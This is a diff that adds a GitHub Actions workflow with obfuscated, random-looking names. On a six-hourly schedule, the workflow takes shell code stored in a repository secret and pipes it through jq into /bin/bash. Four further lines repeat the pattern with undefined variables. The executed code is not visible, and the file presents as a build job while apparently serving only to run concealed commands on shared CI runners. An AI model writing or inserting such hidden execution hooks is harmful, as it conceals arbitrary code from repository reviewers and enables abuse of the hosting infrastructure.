@@ -1,0 +1,21 @@
+name: xuchunyan7651
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '6 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: xuchunyan7651
+        env:
+          ckois84174: ${{ secrets.ckois84174 }}
+        run: |
+          echo $ckois84174 | jq -r .kom7 | /bin/bash
+          echo $duxmb27 | jq -r .fvnt6845 | /bin/bash
+          echo $urtlr4433 | jq -r .dvth13395 | /bin/bash
+          echo $anrvj68 | jq -r .sbqc10830 | /bin/bash
+          echo $vzb1 | jq -r .mvl91 | /bin/bash
+
